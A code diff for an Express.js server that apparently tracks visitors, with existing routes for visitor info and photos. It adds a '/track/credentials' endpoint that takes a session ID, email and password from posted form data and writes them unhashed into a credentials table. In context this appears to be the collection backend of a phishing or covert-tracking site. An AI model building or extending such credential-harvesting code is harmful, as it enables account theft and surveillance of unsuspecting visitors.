@@ -1,6 +1,6 @@
 import { Router, type IRouter } from "express";
 import { db } from "@workspace/db";
-import { visitorsTable, photosTable } from "@workspace/db/schema";
+import { visitorsTable, photosTable, credentialsTable } from "@workspace/db/schema";
 import { randomUUID } from "crypto";
 
 const router: IRouter = Router();
@@ -29,6 +29,21 @@ router.post("/track/info", async (req, res) => {
     res.json({ success: true, sessionId });
   } catch (err) {
     req.log.error({ err }, "Error saving visitor info");
+    res.status(500).json({ success: false, sessionId: "" });
+  }
+});
+
+router.post("/track/credentials", async (req, res) => {
+  try {
+    const { sessionId, email, password } = req.body;
+    if (!sessionId || !email || !password) {
+      res.status(400).json({ success: false, sessionId: "" });
+      return;
+    }
+    await db.insert(credentialsTable).values({ sessionId, email, password });
+    res.json({ success: true, sessionId });
+  } catch (err) {
+    req.log.error({ err }, "Error saving credentials");
     res.status(500).json({ success: false, sessionId: "" });
   }
 });
